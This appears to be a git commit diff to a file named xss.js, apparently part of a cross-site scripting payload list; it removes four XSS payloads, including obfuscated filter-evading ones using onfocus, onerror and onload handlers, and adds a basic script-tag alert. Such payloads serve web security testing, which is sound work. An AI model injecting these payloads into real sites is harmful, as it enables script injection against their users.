6c0cf3a8bcd9b3998815e394fed7b2df4da1886d
IYBmad <city_a.m@live.fr>
2024-09-08 23:44:56 +0100

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,4 +1,1 @@
-Javascript:alert(1)
-<A AutoFocus HRef %252F=\"\"OnFocus=top//?.['al'%2B'ert'](1)>
-"><img src=q onerror=alert(1)>
-"><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``^1//
+<script>alert(1)</script>
